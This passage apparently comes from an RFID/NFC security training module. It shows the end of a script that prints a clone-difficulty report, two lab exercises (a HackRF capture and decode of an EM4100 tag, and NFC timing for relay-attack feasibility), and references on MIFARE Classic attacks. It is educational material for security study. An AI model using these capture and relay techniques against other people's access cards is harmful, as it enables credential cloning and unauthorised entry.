        key=lambda x: difficulty_order.index(x[1]["clone_difficulty"])
    )

    for tag_name, info in sorted_tags:
        print(f"\n--- {tag_name} ---")
        print(f"  Frequency:        {info['frequency']}")
        print(f"  Authentication:   {info['authentication']}")
        print(f"  Encryption:       {info['encryption']}")
        print(f"  Clone Difficulty:  {info['clone_difficulty']}")
        print(f"  Attack Time:      {info['attack_time']}")
        print(f"  Countermeasure:   {info['countermeasure']}")

    # Summary table
    print(f"\n{'='*70}")
    print("SUMMARY TABLE")
    print(f"{'Tag Type':<25} {'Difficulty':<15} {'Attack Time':<25}")
    print("-" * 65)
    for tag_name, info in sorted_tags:
        print(f"{tag_name:<25} {info['clone_difficulty']:<15} {info['attack_time']:<25}")


if __name__ == "__main__":
    print_assessment_report()
```

## Hands-on Exercises

### Exercise 1: LF RFID Capture and Decode

**Objective**: Capture a 125 kHz LF RFID signal using HackRF, decode the EM4100 tag data from raw I/Q samples, and verify against a known tag.

**Setup**: You need a HackRF One with an LF RFID antenna (or a loop antenna tuned to 125 kHz), an EM4100 tag, and a 125 kHz RFID reader to activate the tag during capture.

**Tasks**:

1. Capture the LF RFID signal while a reader is activating the tag:
   ```bash
   # Start capture
   hackrf_transfer -r lf_capture.raw -f 125000 -s 406250 -l 32 -g 20 -n 40625000

   # During the 10-second capture, present the EM4100 tag to a reader
   ```

2. Decode the captured signal:
   ```bash
   python3 lf_rfid_decoder.py lf_capture.raw 406250
   ```

3. Verify the decoded tag ID matches the physical tag by reading it with a standard LF RFID reader.

**Deliverables**: Decoded tag ID, raw capture file hash, comparison with known tag data, analysis of signal quality and decode reliability.

### Exercise 2: NFC Relay Timing Measurement

**Objective**: Measure the timing characteristics of an NFC communication session and determine if relay attacks would be feasible given different network conditions.

**Setup**: Use an NFC reader (ACR122U) and a MIFARE Classic tag. Use the Python NFC tools (pyscard) to measure transaction times.

**Tasks**:

1. Measure baseline NFC transaction timing:
   ```python
   import time
   # Measure 100 authentication round-trips
   times = []
   for i in range(100):
       start = time.perf_counter_ns()
       # Send REQA, receive ATQA
       # (use pyscard library for actual reader communication)
       end = time.perf_counter_ns()
       times.append(end - start)

   import statistics
   print(f"Mean: {statistics.mean(times)/1e6:.3f} ms")
   print(f"Stdev: {statistics.stdev(times)/1e6:.3f} ms")
   print(f"Max: {max(times)/1e6:.3f} ms")
   ```

2. Calculate the maximum tolerable relay latency based on the NFC specification timing requirements.

3. Test relay simulation over different network types (localhost, WiFi, internet) and determine which connections allow successful relay attacks.

**Deliverables**: Timing measurement data, relay feasibility analysis per network type, written assessment of countermeasure effectiveness.

## References

1. **NXP MIFARE Documentation** - Official MIFARE Classic, DESfire, and NTAG product documentation including security features and implementation guidelines.

2. **ISO/IEC 14443** - Identification cards - Contactless integrated circuit cards - Proximity cards. The international standard defining Type A and Type B NFC communication protocols.

3. **ISO/IEC 15693** - Identification cards - Contactless integrated circuit cards - Vicinity cards. Standard for longer-range RFID at 13.56 MHz.

4. **NIST SP 800-116 Rev. 1** - Guidelines for the Use of PIV Credentials in Facility Access. Provides guidance on RFID/NFC access control security including cloning countermeasures.

5. **"Dismantling MIFARE Classic"** - de Koning Gans, Hoepman, and Garcia (2008). The seminal paper on CRYPTO1 vulnerabilities that broke MIFARE Classic security.

6. **"Wirelessly Pickpocketing a Mifare Classic Card"** - Garcia et al. (2009). Practical attacks against MIFARE Classic including key recovery in under one second.

7. **Proxmark3 Community** - Open-source RFID/NFC research tool with extensive documentation on tag analysis and attack techniques, https://proxmark.com/

8. **RFID Security Research** - IOActive, Rapid7, and other security firms' published research on RFID/NFC vulnerabilities and attack techniques.
